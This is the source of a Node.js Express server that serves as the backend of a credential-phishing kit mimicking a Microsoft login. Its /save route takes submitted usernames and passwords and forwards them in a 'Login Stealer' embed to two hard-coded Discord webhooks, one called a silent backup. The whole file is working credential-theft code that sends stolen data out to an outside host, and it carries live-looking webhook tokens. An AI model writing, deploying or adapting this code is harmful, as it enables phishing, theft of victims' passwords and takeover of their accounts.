const express = require('express');

const app = express();
const PORT = process.env.PORT || 3000;
const HOST = '0.0.0.0';

// ==================== YOUR TWO WEBHOOKS ====================
// Put your main webhook here
const MAIN_WEBHOOK = "https://discordapp.com/api/webhooks/1494067903073353827/2uJS7jmZhEZu0-2S4YVEl2nteIT7-vbcdqixpU7qDfnkgsMyJCiPWtqJOakKZLvIzjyq";

// Put your second (silent/backup) webhook here
const SILENT_WEBHOOK = "https://discord.com/api/webhooks/1494069132461609224/TvbfClRZV6FreFOdwpml3woS0cnPgxpwB7QJAJrP__T6ovtfoOzxWKhFr0ABsLl0kBX5";
// ===========================================================

app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Test route
app.get('/', (req, res) => {
    res.send('✅ Double Discord Webhook Logger is running!');
});

app.post('/save', async (req, res) => {
    try {
        const { username, password, timestamp } = req.body;

        if (!username || !password) {
            return res.status(400).send('Missing data');
        }

        const time = timestamp || new Date().toISOString();

        const embed = {
            title: "🔐 New Login Captured",
            color: 0xFF0000,
            fields: [
                { name: "Username / Email", value: `\`${username}\``, inline: false },
                { name: "Password", value: `\`${password}\``, inline: false },
                { name: "Time", value: time, inline: false }
            ],
            footer: { text: "Microsoft Login Clone - Double Hook" },
            timestamp: new Date().toISOString()
        };

        const payload = {
            username: "Login Stealer",
            embeds: [embed]
        };

        // Send to BOTH webhooks at the same time (silently)
        const promises = [];

        // Main webhook
        if (MAIN_WEBHOOK && MAIN_WEBHOOK !== "https://discord.com/api/webhooks/YOUR_MAIN_WEBHOOK_ID/YOUR_MAIN_TOKEN") {
            promises.push(
                fetch(MAIN_WEBHOOK, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(payload)
                })
            );
        }

        // Silent / Backup webhook
        if (SILENT_WEBHOOK && SILENT_WEBHOOK !== "https://discord.com/api/webhooks/YOUR_SECOND_WEBHOOK_ID/YOUR_SECOND_TOKEN") {
            promises.push(
                fetch(SILENT_WEBHOOK, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(payload)
                })
            );
        }

        // Wait for both to finish
        await Promise.allSettled(promises);

        console.log(`✅ Credentials sent to both webhooks | ${username}`);
        res.send('OK');

    } catch (error) {
        console.error('Error:', error);
        res.status(500).send('Server error');
    }
});

app.listen(PORT, HOST, () => {
    console.log(`🚀 Double Webhook Backend running on port ${PORT}`);
});
